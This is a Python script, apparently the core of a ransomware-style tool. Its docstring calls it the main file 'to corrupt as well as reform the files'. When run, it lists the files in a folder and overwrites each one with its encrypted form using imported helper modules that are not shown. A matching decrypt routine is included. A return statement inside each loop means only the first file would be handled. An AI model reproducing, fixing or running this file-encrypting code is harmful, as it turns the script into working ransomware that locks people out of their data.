import Files as Files
import Rebuilder as Rebuilder
"""
Main file to corrupt as well as reform the files
"""
class main:
    def __init__(self) -> None:
        """
        Initialise all the dependency and objects
        """
        self.files = Files.Folder().list_files(location = "")
        self.file_ops = Files.FileOperations()
        self.cryptograph = Rebuilder.Cryptograph()

    def encrypt(self):
        """
        Function that invokes encryption
        """
        for file in self.files:
            data = self.cryptograph.encrypt(self.file_ops.read_file(file).decode())
            return self.file_ops.write_file(file, data.decode())
  
    def decrypt(self):
        """
        Function to invoke decryption
        """
        for file in self.files:
            data = self.cryptograph.decrypt(self.file_ops.read_file(file))
            return self.file_ops.write_file(file, data.decode())

if __name__ == "__main__":
    m = main()
    m.encrypt()